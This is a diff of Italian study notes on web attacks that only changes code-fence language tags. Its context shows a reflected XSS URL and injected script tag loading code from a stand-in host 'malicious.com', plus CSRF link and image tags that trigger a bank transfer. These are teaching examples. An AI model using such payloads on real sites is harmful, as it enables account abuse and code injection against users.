@@ -73,7 +73,7 @@ Questo attacco si dice non persistente in quanto non inietta permanentemente lo 
 ```
 https://example.com/welcome.php?nome_utente=%3Cscript%20src=%22http://malicious.com/evil.js%22%3E%3C/script%3E"
 ```
-```
+```html
 <h1>Ciao, <script src="http://malicious.com/evil.js"></script></h1>
 ```
 
@@ -85,14 +85,14 @@ Fare il controllo dell'input non fidato. In alternativa i browser moderni fanno 
 
 
 ### CSRF (cross site request forgery)
-```html
+```
 <a href="http://securebank.com/bonifico?account=bob&amount=1000000&for=Fred">clicca qui</a> 
 ```
 Se l'utente è già loggato, nel momento in cui fa click sul link, parte il bonifico di $1000000.
 
 È possibile anche evitare di richiedere l'azione da parte dell'utente.
 
-```html
+```
 <img src="http://securebank.com/bonifico?account=bob&amount=1000000&for=Fred">clicca qui</a> 
 ```
 
